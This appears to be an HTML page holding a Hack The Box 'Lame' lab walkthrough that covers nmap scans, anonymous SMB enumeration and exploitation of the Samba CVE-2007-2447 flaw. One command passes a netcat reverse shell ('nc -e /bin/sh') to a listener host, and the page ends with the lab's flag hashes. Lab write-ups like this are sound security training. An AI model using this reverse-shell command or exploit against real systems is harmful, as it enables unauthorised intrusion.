@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>HTB Lame - HTB Writeups</title>
+  </head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">HTB Writeups</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">HTB Lame</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1677535230221"
+                  >2023-02-27 17:00</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1678122547536"
+                  >2023-03-06 12:09</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><p>We start with a scan:<br />
+nmap -Pn -sC -sV -oA nmap/initial 10.10.10.3<br />
+<img src="/_resources/c567a401c69b410fbd19a8e80dd635aa.png" /></p>
+<p>We see an ftp server with anonymous login, and smb server.</p>
+<p>We run a full port scan and find an additional port:<br />
+nmap -Pn -sC -sV -p- -oA nmap/full 10.10.10.3<br />
+<img src="/_resources/29486510bff3417088380bbee60ea40f.png" /></p>
+<p>We also see a FQDN for the machine:<br />
+<img src="/_resources/f535a120134d442a8edfba0408b69e08.png" /></p>
+<p>The ftp server appears to be empty:<br />
+<img src="/_resources/06ac5ef26bf144938b4132efceb869c8.png" /></p>
+<p>We use crackmapexec smb 10.10.10.3 -u "" -p "" --shares:<br />
+<img src="/_resources/9acafc16bda74946b47704f3f77a1515.png" /></p>
+<p>There is apparently an exploit for Samba v3.0.20:<br />
+<a title="https://www.exploit-db.com/exploits/16320" href="https://www.exploit-db.com/exploits/16320">https://www.exploit-db.com/exploits/16320</a><br />
+<a title="https://github.com/amriunix/CVE-2007-2447" href="https://github.com/amriunix/CVE-2007-2447">https://github.com/amriunix/CVE-2007-2447</a><br />
+That one doesn't work, but this one does:<br />
+<a title="https://github.com/Ziemni/CVE-2007-2447-in-Python" href="https://github.com/Ziemni/CVE-2007-2447-in-Python">https://github.com/Ziemni/CVE-2007-2447-in-Python</a></p>
+<p>We execute the script and get a shell:<br />
+ython3 smbExploit.py 10.10.10.3 'nc -e /bin/sh 10.10.14.6 1337'</p>
+<p><img src="/_resources/f7f72650c21546abada3279a8896db59.png" /><br />
+63bd7d21376b0fc1c57e34ebc4e1529f<br />
+<img src="/_resources/29110d9ff1be44c7a2473fd8503a69a1.png" /><br />
+f450f84717bc3962ad83162be66f6b73</p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
